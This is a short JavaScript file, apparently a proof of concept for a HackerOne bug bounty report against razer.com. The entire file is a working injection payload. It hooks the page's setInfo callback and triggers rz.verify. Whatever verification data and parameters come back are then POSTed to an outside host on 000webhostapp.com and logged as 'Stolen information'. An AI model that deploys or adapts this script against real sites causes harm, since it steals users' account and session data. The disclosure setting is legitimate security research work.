/**
 * This script is only for the PoC for #723060 @hackerone to razer.com
 */

razerInjection = () => {

    // Hook the function fired after the rz.verify.
    window.setInfo = (data) => {
        var pst= [data,_params];
        var xhr = new XMLHttpRequest();
        xhr.open('POST','https://corraldev.000webhostapp.com/gold.razer/');
        xhr.send(JSON.stringify(pst))
        console.log('Stolen information ', pst);
    };

    window.rz.init(_params);
    window.rz.verify();

}
razerInjection();